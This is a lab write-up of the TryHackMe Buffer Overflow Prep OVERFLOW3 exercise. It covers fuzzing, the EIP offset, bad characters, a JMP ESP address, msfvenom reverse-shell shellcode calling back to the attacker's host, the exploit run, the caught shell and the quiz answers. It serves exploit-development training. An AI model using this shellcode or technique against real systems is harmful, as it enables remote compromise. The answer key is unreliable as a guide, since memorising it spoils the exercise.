# OVERFLOW3
## Mona Configuration
```
!mona config -set workingfolder C:\mona\%p
```
## Fuzzing
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 3$ ./fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing crashed at 1300 bytes
```
## Controlling EIP
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 3$ cyclic 1700
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaq
```
Program crashes with `61746D61` in EIP register
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 3$ python -c 'print(bytes.fromhex("61746D61")[::-1].decode())'
amta
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 3$ cyclic -l amta
1274
```
Offset to EIP register is `1274` bytes
## Finding Bad Chars
In Immunity Debugger:
```
!mona bytearray -b "\x00"
```
On attacking box:
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 3$ python -c '[print("\\x" + "{:02x}".format(x), end="") for x in range(1,256)]'
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
Re-run `exploit.py` and do memory comparison in Immunity Debugger
```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0194FA30
```
```
mona Memory comparison results
Address                    Status                     BadChars                                      Type                       Location
0x0194fa30                 Corruption after 16 bytes  00 11 12 40 41 5f 60 b8 b9 ee ef              normal                     Stack
```
Bad chars are `\x00\x11\x40\x5F\xb8\xee`
## Finding a Jump Point
```
!mona jmp -r esp -b "\x00\x11\x40\x5F\xb8\xee"
```
```
Log data, item 4
 Address=62501203
 Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
```
We will jump to address `\x03\x12\x50\x62`
## Payload
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 3$ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b "\x00\x11\x40\x5F\xb8\xee" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=20, char=0xee)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=275, char=0x11)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=4, char=0xee)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of c file: 1514 bytes
unsigned char buf[] =
"\xfc\xbb\x1f\xd5\xc7\xa3\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xe3\x3d\x45"
"\xa3\x1b\xbe\x2a\x2d\xfe\x8f\x6a\x49\x8b\xa0\x5a\x19\xd9"
"\x4c\x10\x4f\xc9\xc7\x54\x58\xfe\x60\xd2\xbe\x31\x70\x4f"
"\x82\x50\xf2\x92\xd7\xb2\xcb\x5c\x2a\xb3\x0c\x80\xc7\xe1"
"\xc5\xce\x7a\x15\x61\x9a\x46\x9e\x39\x0a\xcf\x43\x89\x2d"
"\xfe\xd2\x81\x77\x20\xd5\x46\x0c\x69\xcd\x8b\x29\x23\x66"
"\x7f\xc5\xb2\xae\xb1\x26\x18\x8f\x7d\xd5\x60\xc8\xba\x06"
"\x17\x20\xb9\xbb\x20\xf7\xc3\x67\xa4\xe3\x64\xe3\x1e\xcf"
"\x95\x20\xf8\x84\x9a\x8d\x8e\xc2\xbe\x10\x42\x79\xba\x99"
"\x65\xad\x4a\xd9\x41\x69\x16\xb9\xe8\x28\xf2\x6c\x14\x2a"
"\x5d\xd0\xb0\x21\x70\x05\xc9\x68\x1d\xea\xe0\x92\xdd\x64"
"\x72\xe1\xef\x2b\x28\x6d\x5c\xa3\xf6\x6a\xa3\x9e\x4f\xe4"
"\x5a\x21\xb0\x2d\x99\x75\xe0\x45\x08\xf6\x6b\x95\xb5\x23"
"\x3b\xc5\x19\x9c\xfc\xb5\xd9\x4c\x95\xdf\xd5\xb3\x85\xe0"
"\x3f\xdc\x2c\x1b\xa8\xe9\xb6\x34\x29\x86\xb4\x3a\x38\x0a"
"\x30\xdc\x50\xa2\x14\x77\xcd\x5b\x3d\x03\x6c\xa3\xeb\x6e"
"\xae\x2f\x18\x8f\x61\xd8\x55\x83\x16\x28\x20\xf9\xb1\x37"
"\x9e\x95\x5e\xa5\x45\x65\x28\xd6\xd1\x32\x7d\x28\x28\xd6"
"\x93\x13\x82\xc4\x69\xc5\xed\x4c\xb6\x36\xf3\x4d\x3b\x02"
"\xd7\x5d\x85\x8b\x53\x09\x59\xda\x0d\xe7\x1f\xb4\xff\x51"
"\xf6\x6b\x56\x35\x8f\x47\x69\x43\x90\x8d\x1f\xab\x21\x78"
"\x66\xd4\x8e\xec\x6e\xad\xf2\x8c\x91\x64\xb7\xad\x73\xac"
"\xc2\x45\x2a\x25\x6f\x08\xcd\x90\xac\x35\x4e\x10\x4d\xc2"
"\x4e\x51\x48\x8e\xc8\x8a\x20\x9f\xbc\xac\x97\xa0\x94\xac"
"\x17\x5f\x17";
```
## Exploit
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 3$ ./exploit.py
Sending evil buffer...
Done!
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 3$ nc -lnvp 4444
Connection from 10.10.80.211:49253
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>echo PWNED OVERFLOW3!
echo PWNED OVERFLOW3!
PWNED OVERFLOW3!

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```
## Questions
What is the EIP offset for OVERFLOW3?
```
1274
```
In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW3?
```
\x00\x11\x40\x5f\xb8\xee
```